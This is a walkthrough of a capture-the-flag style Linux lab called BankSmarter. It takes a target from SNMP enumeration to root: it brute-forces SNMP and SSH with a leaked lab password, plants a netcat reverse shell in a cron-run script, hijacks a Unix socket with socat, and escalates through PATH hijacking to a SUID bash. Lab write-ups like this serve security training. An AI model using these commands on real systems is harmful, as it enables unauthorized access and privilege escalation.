# [HackSmarter.org - BankSmarter](https://www.hacksmarter.org/courses/c90bd016-24a5-4776-9f35-819062c51f6f/take)

![4a589237c153bb35c4e5a137b40e2b13.png](/resources/4a589237c153bb35c4e5a137b40e2b13.png)

## Table of Contents

- [Abstract](#abstract)
- [Scope and Objective](#scope-and-objective)
- [Enumeration](#enumeration)
- [Footholding as "layne.stanley"](#footholding-as-laynestanley)
- [Script replacement to obtain shell as scott.weiland](#script-replacement-to-obtain-shell-as-scottweiland)
- [Unix Socket hijacking to shell as ronnie.stone](#unix-socket-hijacking-to-shell-as-ronniestone)
- [PATH hijacking of SUID binary to shell as root](#path-hijacking-of-suid-binary-to-shell-as-root)

***
## Abstract 
BankSmarter is a lab simulated penetesting test against a standalone Linux server where only SSH and SNMP ports are exposed.

With correct community string, we can obtain credential of "layne.stanley" that leaked over SNMP and footholding on the server, the server has cronjob running shell script located inside "layne.stanley" home directory as "scott.weiland" every minute which we can remove it and replace with a new one to have interacive shell as "scott.weiland" user.

There is a script that will generate unix socket as it was executed as "ronnie.stone" so we can use socat to hijack it and get a shell as "ronnie.stone".

To become root, there is a custom SUID binary that will execute a python script upon executing, the python script have insecure method of shebang to define which binary to execute the entire script so we can hijack the PATH variable to run our script and get a shell as root. 

## Scope and Objective
You are a senior operator on the Hack Smarter Red Team, tasked with a penetration test against a standalone Linux server. Your objective is to gain initial access and escalate privileges to root, emulating a worst-case scenario where a threat actor successfully compromises a critical asset.

You have been given the IP address of the target server and your mission is to gain a foothold, escalate to the root user, and retrieve the final flag from the `/root/` directory.

## Enumeration

Our initial port scan shows that there are only SSH port open, this is very suspicious so we will take another scan on UDP ports next 
```
rustscan -a banksmarter.hs -- -A
```
![f865ea2c185a113fcd76a5e466feb572.png](/resources/f865ea2c185a113fcd76a5e466feb572.png)

Since scanning all UDP ports gonna take a while, I only pick a few to scan such as SNMP port on 161 which we can see that there is SNMP running on this server
```
nmap -sU -p 161 banksmarter.hs
```
![d82e07e19ff9ea6b5ae8515ab20a0f60.png](/resources/d82e07e19ff9ea6b5ae8515ab20a0f60.png)

We can now bruteforce for community string next using "onesixtyone" wordlist from seclists and we can see that "public" is a valid community string
```
nmap -sU -p 161 --script snmp-brute banksmarter.hs --script-args snmp-brute.communitiesdb=/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt
```
![5e336577e7198ff0e8df486ca12ad5e5.png](/resources/5e336577e7198ff0e8df486ca12ad5e5.png)

## Footholding as "layne.stanley"

I will use snmpbulkwalk which is a turbo version of snmpwalk which can be used to query device information over SNMP protocol and we don't have to let it run for long since we instantly have credential pair of "Layne.Stanley" at the top 

```
snmpbulkwalk -c public -v 2c banksmarter.hs
```
![8cfc0de16ae4fe5e167cf3a38c30ccb9.png](/resources/8cfc0de16ae4fe5e167cf3a38c30ccb9.png)

However, we can not use login to the target server over SSH yet, probably because of username is not in the correct one

![c1d5a3642d6beb1a64e42db140355b4d.png](/resources/c1d5a3642d6beb1a64e42db140355b4d.png)

I will use [username-anarchy](https://github.com/urbanadventurer/username-anarchy) to create variation of "Layne Stanley" to bruteforce 

![44f1de4b258b8049c0e043fdd8398500.png](/resources/44f1de4b258b8049c0e043fdd8398500.png)

Using tool like hydra, we can now see that the correct username is "layne.stanley"

```
hydra -L user.txt -p '5t6^jahTRjab' ssh://banksmarter.hs
```
![8e4743d62570e0950ced485a4230df99.png](/resources/8e4743d62570e0950ced485a4230df99.png)

Now we are able to land our foothold on the server and loot user flag

```
sshpass -p '5t6^jahTRjab' ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" layne.stanley@banksmarter.hs
```
![f3a2c5559aeffc44e1df68210e9134f8.png](/resources/f3a2c5559aeffc44e1df68210e9134f8.png)

There is a suspicious backup script located inside home folder of "layne.stanley" user but it is owned by "scott.weiland" and we can read and execute it as well

![fbf78d1065070582808bf2a562d4919b.png](/resources/fbf78d1065070582808bf2a562d4919b.png)

The script will simulates customer account data export and API key rotation, but it is useless if we can not execute as another user

![5e0d590453372dd8fc722527faaca857.png](/resources/5e0d590453372dd8fc722527faaca857.png)

I check `/tmp` directory where the export directory will be created and I can see that this script is already executed so maybe there is some kind of cronjob execute it in regular interval

![225976e09c81bc7e740da61ce570ee2a.png](/resources/225976e09c81bc7e740da61ce570ee2a.png)

I will run linpeas to let it enumerate and we can see that there are 2 more users that we might need to compromise first before get our hand on root user

![aa96ae79482147e7e8671df284304786.png](/resources/aa96ae79482147e7e8671df284304786.png)
![e7d67fa409e6923a659f37e25a1d3d43.png](/resources/e7d67fa409e6923a659f37e25a1d3d43.png)

There is a custom SUID binary as well but only user in "bankers" group ("ronnie.stone") can execute it beside root

![f383e9e9cf83a3e836d1a03a63ec6773.png](/resources/f383e9e9cf83a3e836d1a03a63ec6773.png)

After that, I ran [pspy](https://github.com/DominicBreuker/pspy) to check for cronjob and noticed a cronjob that run a python script located in `/opt/bank` as "ronnie.stone" user

![e31a49ec10d87eb9fb7c0d485a4175c2.png](/resources/e31a49ec10d87eb9fb7c0d485a4175c2.png)

This directory can be accessed by any user in "bank-team" group so we will need to become "scott.weiland" or "ronnie.stone" first

![200922ffc8ba94e8592b4e2f1bac11ca.png](/resources/200922ffc8ba94e8592b4e2f1bac11ca.png)

## Script replacement to obtain shell as scott.weiland

The backup script we found earilier will be executed every minute via cronjob as "scott.weiland" but since we can not directly modify the script, what can we do?

![0bea98b379a6a98fde4ce1176753bf46.png](/resources/0bea98b379a6a98fde4ce1176753bf46.png)

File deletion depends on directory permissions, NOT file permissions so we can directly remove it and create a new one in our version, and we can even be more steathy by copy the content of old script and sneak our command in

![e938ca6ff70728f337881a35eef1ea86.png](/resources/e938ca6ff70728f337881a35eef1ea86.png)

As I need fully interactive shell of "scott.weiland" to have his group permission to access `/opt/bank` directory, I will sneak my reverse shell command it in

```
busybox nc $Your_IP 4444 -e /bin/bash
```

Then I will set penelope as my reverse shell listerner since it does a pretty great job on upgrading a shell and have some C2-like feeling it in as well
```
penelope
```

Our new script will not get execute yet since it lacks of execution permission so just grant it one and we should have a shell of "scott.weiland" on penelope in a few moment
```
chmod +x /home/layne.stanley/bankSmarter_backup.sh
```
![5499bb61f262d2f9b5e88695fecac3c6.png](/resources/5499bb61f262d2f9b5e88695fecac3c6.png)

## Unix Socket hijacking to shell as ronnie.stone 

Now we can access `/opt/bank` directory, it does have 1 bash script and a python script we discovered via pspy so lets read python script first

![8fbe002b0c07c70150228e294ab516b3.png](/resources/8fbe002b0c07c70150228e294ab516b3.png)

And... another session just created on my penelope so I will blank out the content of backup script first to avoid having too many sessions 

![115fd6e5bde8d7cec0873fd975c42ee8.png](/resources/115fd6e5bde8d7cec0873fd975c42ee8.png)
![ea4846dc408c04e76e5f2b906d156bdd.png](/resources/ea4846dc408c04e76e5f2b906d156bdd.png)

The python script, once executed, it is basically a Unix socket PTY (pseudo-terminal) server that provides shell access through a Unix domain socket where it will create a Unix Socket as "ronnie.stone" and any user that can interact with this socket can have a shell of the user who run it (which is "ronnie.stone")

![1e16abb01cbb2e544104ab294e070ecd.png](/resources/1e16abb01cbb2e544104ab294e070ecd.png)
![5d85b893b0c15a14666e86bce94675a9.png](/resources/5d85b893b0c15a14666e86bce94675a9.png)

We can use socat that pre-installed on the server to get a shell as "ronnie.stone" and now we should be able to run a custom SUID binary we found via linpeas

```
socat - UNIX-CONNECT:/opt/bank/sockets/live.sock
```
![b3cab23dc488503ccd2625c2295104b3.png](/resources/b3cab23dc488503ccd2625c2295104b3.png)

## PATH hijacking of SUID binary to shell as root

I originally want to run `ltrace` to check how it works but we do not have it installed and I can not even download it to my machine

![27edb45bef8939a2031b17c4d446bbe7.png](/resources/27edb45bef8939a2031b17c4d446bbe7.png)
![7f509aa76c0f69833d00b3840122cc31.png](/resources/7f509aa76c0f69833d00b3840122cc31.png)

I have no other choice but to run it and we can see that beside itself, it will also run `bank_backup.py` as well

![76585cc8a1541cff8b5acef0f5324774.png](/resources/76585cc8a1541cff8b5acef0f5324774.png)

The script is located on the same directory as the SUID binary and we have read permission over it, the script defines a dangerous shebang by using `python3` which relying on the `PATH` variable to find the location of `python3` binary to execute and if we hijack the `PATH` by simply create a new `python3` script or binary in any directory we have write permission such as `/tmp`, we can then add it at the first path in `PATH` variable so I will find `python3` in that new path and execute it 

![835b104e087a207eb10b031dbf08fa8d.png](/resources/835b104e087a207eb10b031dbf08fa8d.png)

I will simply use this script that will copy `/bin/bash` to `/tmp` directory, set SUID bit and run it with `-p` to get us a shell as root 

```
#!/bin/bash
cp /bin/bash /tmp/bash
chmod u+s /tmp/bash
/tmp/bash -p
```

What left is to add path to `PATH` variable which is `/tmp` in my case, give our custom script execute permission and run SUID binary again and now we have shell as root and can loot root flag
```
export PATH="/tmp:$PATH"
chmod +x python3
/usr/local/bin/bank_backupd
```
![2cde7ca23d700c87325674d84801f006.png](/resources/2cde7ca23d700c87325674d84801f006.png)

We are done :D

***
